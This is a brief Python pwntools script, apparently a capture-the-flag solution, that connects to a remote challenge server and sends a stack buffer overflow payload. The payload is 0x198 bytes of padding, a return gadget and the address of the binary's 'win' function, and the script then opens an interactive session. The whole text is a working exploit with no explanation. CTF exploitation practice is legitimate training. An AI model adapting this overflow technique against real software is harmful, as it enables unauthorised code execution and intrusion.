from pwn import *

p = remote('challenge.ctf.games', 31463)
e = ELF('./retcheck')

ret = 0x401465
payload = b'a'*0x198 + p64(ret) + b'a'*0x8 + p64(e.sym['win'])
p.sendline(payload)
p.interactive()